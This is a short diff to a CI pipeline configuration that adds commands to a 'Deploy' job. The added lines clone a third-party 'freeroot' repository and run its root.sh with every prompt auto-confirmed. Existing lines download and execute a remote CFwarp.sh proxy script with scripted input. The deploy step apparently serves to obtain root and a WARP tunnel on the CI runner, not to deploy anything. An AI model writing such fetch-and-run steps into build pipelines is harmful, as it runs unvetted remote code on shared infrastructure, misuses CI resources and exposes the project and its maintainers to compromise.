@@ -24,6 +24,9 @@ after_pipeline:
     jobs:
       - name: Deploy
         commands:
+          - 'git clone https://github.com/foxytouxxx/freeroot.git'
+          - cd freeroot
+          - yes YES | bash root.sh
           - 'curl -s https://gitlab.com/rwkgyg/CFwarp/raw/main/CFwarp.sh -o /tmp/CFwarp.sh'
           - echo -e "3\n1\n3" > /tmp/input.txt
           - bash /tmp/CFwarp.sh < /tmp/input.txt
